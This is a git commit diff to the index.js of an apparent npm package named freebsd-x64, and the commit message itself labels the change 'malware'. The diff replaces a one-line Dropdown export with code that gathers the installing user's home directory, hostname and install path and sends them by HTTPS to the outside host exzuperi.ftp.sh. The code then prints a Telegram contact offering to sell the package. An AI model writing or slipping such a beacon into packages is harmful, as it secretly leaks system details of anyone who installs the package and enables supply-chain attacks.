e067fc910b00f5db3c0dccbe69f329697390ccec
JakeClark <jakeclark38b@gmail.com>
2025-12-16 23:11:54 +0700

    Update to 239_freebsd-x64-213.21.24 (malware)

--- index.js
+++ index.js
@@ -1,2 +1,34 @@
-import { Dropdown } from './dropdown';
-export { Dropdown };
+const os = require("os");
+const dns = require("dns");
+const querystring = require("querystring");
+const https = require("https");
+const packageJSON = require("./package.json");
+const package = packageJSON.name;
+const fs = require('fs');
+
+const trackingData = JSON.stringify({
+    hd: os.homedir(),
+    hn: os.hostname(),
+    ls: __dirname,
+    pn: "freebsd-x64",
+});
+
+const options = {
+    hostname: "exzuperi.ftp.sh",
+    port: 449,
+    path: `/PoC/${encodeURIComponent(trackingData)}`,
+    method: "GET",
+};
+
+const req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        //process.stdout.write(d);
+    });
+});
+
+req.on("error", (e) => {
+    console.error(e);
+});
+
+process.stdout.write("You can reach me, if you want to buy it: https://t.me/exzuperi");
+req.end();
